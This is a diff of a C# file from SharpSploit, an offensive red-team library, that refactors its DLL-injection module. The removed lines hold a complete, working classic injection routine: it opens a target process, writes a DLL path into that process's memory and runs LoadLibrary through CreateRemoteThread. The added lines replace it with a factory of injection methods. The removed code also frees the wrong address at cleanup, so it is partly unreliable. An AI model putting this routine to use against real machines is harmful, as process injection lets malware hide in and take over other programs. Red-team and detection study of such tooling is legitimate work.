@@ -1,67 +1,36 @@
 ﻿using System;
-using System.IO;
-using System.Text;
-using SharpSploit.Core;
+using SharpSploit.DLLInjection.Methods;
 
 namespace SharpSploit.DLLInjection
 {
     public class Injection
     {
-        public static void LoadLib(int pid, FileInfo dll)
+        private InjectionMethod _injectionMethod;
+
+        private Injection(InjectionMethod method)
         {
-            Logger.Info("Injecting...");
+            _injectionMethod = method;
+        }
 
-            // get process handle
-            IntPtr hProcess = WinAPI.OpenProcess(
-                    WinAPI.ProcessAccessFlags.CreateThread |
-                    WinAPI.ProcessAccessFlags.QueryInformation |
-                    WinAPI.ProcessAccessFlags.VirtualMemoryOperation |
-                    WinAPI.ProcessAccessFlags.VirtualMemoryRead |
-                    WinAPI.ProcessAccessFlags.VirtualMemoryWrite,
-                    bInheritHandle: false,
-                    processId: pid);
+        public enum Method
+        {
+            CREATE_REMOTE_THREAD,
+            NT_CREATE_THREAD_EX
+        }
 
-            // allocate memory
-            byte[] pathBytes = Encoding.ASCII.GetBytes(dll.FullName + "\0");
-            var addressOfDllPath = WinAPI.VirtualAllocEx(
-                hProcess,
-                IntPtr.Zero,
-                (uint)pathBytes.Length,
-                WinAPI.AllocationType.Reserve | WinAPI.AllocationType.Commit,
-                WinAPI.MemoryProtection.ExecuteReadWrite);
-            Logger.CheckError(addressOfDllPath == IntPtr.Zero, "Failed to allocate memory in process");
+        public static InjectionMethod Factory(Method injectionMethod)
+        {
+            switch (injectionMethod)
+            {
+                case Method.CREATE_REMOTE_THREAD:
+                    return new CreateRemoteThreadMethod();
 
-            // write dll name to process
-            bool success = WinAPI.WriteProcessMemory(
-                hProcess,
-                addressOfDllPath,
-                pathBytes,
-                pathBytes.Length,
-                out IntPtr tmp);
-            Logger.CheckError(!success, "Failed to write to process memory");
+                case Method.NT_CREATE_THREAD_EX:
+                    // return new NtCreateThreadExInjectionStrategy();
 
-            // get kernel module handle
-            IntPtr kernel32Module = WinAPI.GetModuleHandle(WinAPI.KERNEL32_DLL);
-            Logger.CheckError(kernel32Module == IntPtr.Zero, "Cannot get handle to kernel32 module");
-
-            // get load lib addr
-            IntPtr loadLibraryAddress = WinAPI.GetProcAddress(kernel32Module, WinAPI.LOAD_LIBRARY_PROC);
-            Logger.CheckError(loadLibraryAddress == IntPtr.Zero, "Cannot get address of LoadLibrary function");
-
-            // create thread
-            IntPtr hTread = WinAPI.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, addressOfDllPath, 0, IntPtr.Zero);
-            Logger.CheckError(hTread == IntPtr.Zero, "Cannot create remote thread");
-
-            // wait for thread
-            Logger.Info("Waiting for thread...");
-            WinAPI.WaitForSingleObject(hTread, WinAPI.INFINITE);
-
-            // free allocated memory
-            WinAPI.VirtualFreeEx(hProcess, loadLibraryAddress, (uint)pathBytes.Length, WinAPI.FreeType.Release);
-
-            // clean up
-            WinAPI.CloseHandle(hTread);
-            WinAPI.CloseHandle(hProcess);
+                default:
+                    throw new NotSupportedException(string.Format("Injection strategy: {0} is not supported", injectionMethod));
+            }
         }
     }
 }
